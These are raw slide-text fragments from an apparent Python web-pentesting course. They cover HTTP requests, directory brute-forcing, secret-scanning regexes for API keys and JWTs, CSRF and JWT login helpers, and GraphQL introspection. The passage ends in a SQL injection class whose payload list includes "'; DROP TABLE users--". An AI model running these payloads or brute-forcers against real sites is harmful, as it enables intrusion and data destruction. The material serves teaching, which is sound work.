            </a:r>
            <a:br/>
            <a:r>
              <a:t>else:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>hops.append('*')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return hops</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Output:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># [1] 192.168.1.1</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># [2] 10.0.0.1</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># [3] 172.16.0.1</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># [4] 8.8.8.8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2.1.1  HTTP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791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HTTP ANALOGY</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Like ordering food in a restaurant:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Client = You (customer)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Server = Kitchen</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Request = Your order</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Response = Your food</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Headers = Special instructions</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Cookies = Loyalty card</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>HTTP Methods (What you want):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>GET    = "I want to see the menu"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>POST   = "I want to order"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>PUT    = "I want to change my order"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>DELETE = "I want to cancel"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Status Codes (The response):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>2xx = Success ("Your order is ready")</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>3xx = Redirect ("Restaurant moved")</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>4xx = Client Error ("You made a mistake")</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>5xx = Server Error ("Kitchen is on fire")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2.1.2  Requests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REQUESTS LIBRARY</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>import requests</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># GET</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = requests.get(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'https://api.example.com/users',</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>params={'id': 1}</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># POST (JSON)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = requests.post(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'https://api.example.com/login',</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>json={'username': 'admin', 'password': 'pass'}</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># POST (Form Data)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = requests.post(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'https://example.com/login',</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>data={'user': 'admin', 'pass': 'pass'}</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Headers</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>headers = {</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'User-Agent': 'Mozilla/5.0',</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'X-API-Key': 'abc123'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = requests.get(url, headers=headers)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2.1.3  HTTP Session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SESSION MANAGEMENT</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>import requests</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Create session</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>session = requests.Session()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>session.headers.update({'User-Agent': 'Mozilla/5.0'})</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Login (saves cookies)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>session.post(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'https://example.com/login',</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>data={'username': 'admin', 'password': 'pass'}</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Session persists!</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = session.get('https://example.com/dashboard')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Clear session</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>session.cookies.clear()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Save/Load session</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>import pickle</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>with open('session.pkl', 'wb') as f:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>pickle.dump(session, f)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>with open('session.pkl', 'rb') as f:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>session = pickle.load(f)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2.2.1  Directory Brute-Forcing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DIRECTORY BRUTE FORCING</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Like trying all keys to find the right one:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Website = Building</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Directories = Doors</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Wordlist = Key ring</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Finding a directory = Finding an unlocked door</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Why we do it:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Find hidden admin panels (/admin)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Discover backup files (/backup)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Uncover configuration (/config)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Identify API endpoints (/api)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Find development artifacts (/test)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Common wordlist entries:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>admin, login, wp-admin, backup, config, database,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>phpmyadmin, cpanel, webmail, api, v1, v2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2.2.2  Brute-Forcer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BRUTE-FORCER ARCHITECTURE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>DirectoryBruteForcer</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- target_url</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- wordlist</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- extensions</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- threads</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- recursive</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- max_depth</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- results[]</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>▼            ▼            ▼</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Worker     Worker     Worker</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Thread     Thread     Thread</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Status Code</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Filtering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2.2.3  Brute-Forcer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BRUTE-FORCER CODE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def _generate_paths(self, base_path=''):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>paths = []</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for word in self.wordlist:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Add base path</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>path = f"{base_path}/{word}" if base_path</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>else word</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>paths.append(path)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Add with extensions</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for ext in self.extensions:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>paths.append(f"{path}{ext}")</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return paths</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def _check_path(self, path):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>try:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = self.client.get(path,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>allow_redirects=self.follow_redirects</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if response.status_code not in self.exclude:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return BruteForceResult(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>path=path,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>status_code=response.status_code,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>content_length=len(response.content)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>except:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return None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2.2.4  Wordlist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WORDLIST GENERATOR</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>class WordlistGenerator:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def generate_permutations(self, words):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>generated = set()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for word in words:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>generated.add(word)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Add prefixes</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for prefix in ['admin', 'web', 'app']:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>generated.add(f"{prefix}_{word}")</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>generated.add(f"{prefix}{word}")</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Add suffixes</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for suffix in ['admin', 'panel', 'backup']:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>generated.add(f"{word}_{suffix}")</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>generated.add(f"{word}{suffix}")</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Add years</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for year in range(2020, 2026):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>generated.add(f"{word}{year}")</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return sorted(generated)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Technology-specific words:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>WordPress → wp-admin, wp-content, wp-config.php</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>PHP → index.php, admin.php, config.php</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Python → manage.py, settings.py, requirements.txt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2.3.1  HTML Analysis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HTML ANALYSIS CONCEPT</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Like a detective examining a crime scene:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• HTML Document = Crime scene</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Tags = Different rooms</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Attributes = Items in rooms</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Comments = Hidden notes</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Forms = Entry/exit points</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• JavaScript = Security systems</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>What we extract:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Meta data - Page information</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Forms - Input parameters</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Links - Navigation paths</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Comments - Developer notes</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Scripts - JavaScript code</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Emails - Contact information</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Sensitive data - Credentials, API keys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2.3.2  BeautifulSoup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BEAUTIFULSOUP BASICS</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>from bs4 import BeautifulSoup</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Parse HTML</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>soup = BeautifulSoup(html_content, 'lxml')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Find elements</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>title = soup.title.string</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>meta = soup.find_all('meta')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>links = soup.find_all('a', href=True)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>forms = soup.find_all('form')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Find by attribute</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>meta_desc = soup.find('meta', {'name': 'description'})</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Extract forms</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for form in soup.find_all('form'):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>action = form.get('action')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>method = form.get('method', 'GET')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>inputs = form.find_all('input')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for input_tag in inputs:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>name = input_tag.get('name')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>type = input_tag.get('type')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>value = input_tag.get('value')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2.3.3  Form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1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FORM ANALYSIS</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def analyze_form(form):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>form_data = {</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'action': form.get('action'),</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'method': form.get('method', 'GET'),</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'inputs': []</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for input_tag in form.find_all(['input', 'select']):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>input_data = {</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'name': input_tag.get('name'),</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'type': input_tag.get('type', 'text'),</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'value': input_tag.get('value')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Check for sensitive types</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if input_data['type'] == 'password':</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>form_data['has_password'] = True</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if input_data['type'] == 'hidden':</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>form_data['has_hidden'] = True</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if input_data['type'] == 'file':</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>form_data['has_file_upload'] = True</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>form_data['inputs'].append(input_data)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return form_data</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># CSRF Detection</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for input in form['inputs']:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if 'csrf' in input['name'].lower():</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>print(f"[!] CSRF token found: {input['name']}")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2.3.4  Sensitive Data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SENSITIVE DATA DETECTION</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Common patterns to look for</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>SENSITIVE_PATTERNS = {</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'api_key': re.compile(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>r'(api[_-]?key|apikey)\s*[:=]\s*["\']?([^"\']+)',</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>re.IGNORECASE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>),</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'secret': re.compile(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>r'(secret|token|password)\s*[:=]\s*["\']?([^"\']+)',</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>re.IGNORECASE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>),</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'email': re.compile(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>),</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'aws_key': re.compile(r'AKIA[0-9A-Z]{16}'),</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'jwt': re.compile(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Usage</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for pattern_name, pattern in SENSITIVE_PATTERNS.items():</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>matches = pattern.findall(html_content)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if matches:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>print(f"[!] Found {pattern_name}: {matches}")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2.4.1  Authentication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AUTHENTICATION TYPES</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Like entering a secured building:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Username/Password = ID badge</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Session Cookie = Temporary pass</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• JWT Token = Signed pass</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• OAuth = Using another ID</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• 2FA = Extra security check</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• CSRF Token = Unique code for each door</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Types:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Basic Auth - Headers only</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Session-based - Cookie after login</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• JWT - Self-contained token</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• OAuth - Third-party auth</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• API Keys - Simple token for APIs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2.4.2  CSRF Token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CSRF TOKEN EXTRACTION</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def extract_csrf_token(html_content):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Common CSRF field names</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>patterns = [</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>r'&lt;input[^&gt;]*name=["\'](csrf_token|_token)["\']'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>r'[^&gt;]*value=["\']([^"\']+)["\']',</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>r'&lt;input[^&gt;]*value=["\']([^"\']+)["\'][^&gt;]*'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>r'name=["\'](csrf_token|_token)["\']',</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>r'&lt;meta[^&gt;]*name=["\']csrf-token["\'][^&gt;]*'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>r'content=["\']([^"\']+)["\']'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for pattern in patterns:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>match = re.search(pattern, html_content,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>re.IGNORECASE)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if match:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return match.group(2)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return None</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Login with CSRF</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def login_basic(self, url, username, password):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Get login page</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = self.client.get(url)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>csrf = self.extract_csrf_token(response.text)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Submit login</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>login_data = {</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'username': username,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'password': password,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2.4.3  JWT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1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JWT AUTHENTICATION</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def login_jwt(self, login_url, username, password):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Login request</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = self.client.post(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>login_url,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>json={'username': username, 'password': password}</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if response.status_code != 200:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return None</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Extract token from response</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>token = None</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>json_data = response.json()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Try common token fields</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for field in ['token', 'access_token', 'jwt']:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if field in json_data:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>token = json_data[field]</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>break</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if not token and 'data' in json_data:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if isinstance(json_data['data'], dict):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for field in ['token', 'access_token']:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if field in json_data['data']:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>token = json_data['data'][field]</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Set token for future requests</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.set_auth_bearer(token)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return token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3.1.1  API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API RECONNAISSANCE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Like exploring a restaurant menu:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• REST API = Standard menu</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• GraphQL = Customizable menu</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Endpoint = Specific dish</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• JSON/XML = Order format</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• API Key = Loyalty card</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>What we discover:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Available endpoints</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Authentication requirements</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Data formats</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Rate limits</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Potential vulnerabilities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3.1.2  GraphQL Introspection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GRAPHQL INTROSPECTION</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def graphql_introspection(self):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>introspection_query = """</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>query IntrospectionQuery {</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>__schema {</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>queryType { name }</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>types {</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>name</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>kind</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>fields {</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>name</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>type { name }</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"""</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>result = self.graphql_query(introspection_query)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if result:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>schema = result['data']['__schema']</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for type in schema['types']:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if type['kind'] == 'OBJECT':</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>print(f"Type: {type['name']}")</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for field in type.get('fields', []):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>print(f"  {field['name']}")</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return result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3.2.1  Exploit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EXPLOIT FRAMEWORK</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Exploit</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>(Base Class)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- target</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- client</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- vulnerability_type</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>▼             ▼             ▼</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>SQLi      Command     RFI</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Exploit   Injection   Exploit</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>ExploitManager</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- add_exploit()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- run_all()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- get_report()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3.2.2  SQL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SQL INJECTION</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>class SQLInjectionExploit(Exploit):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def __init__(self, target, parameter):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>super().__init__("SQL Injection", target)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.parameter = parameter</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def exploit(self):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>payloads = [</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"' OR '1'='1",</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"' UNION SELECT NULL--",</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"'; DROP TABLE users--",</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"' OR 1=1--"</a:t>
            </a:r>
            <a:br/>
            <a:r>
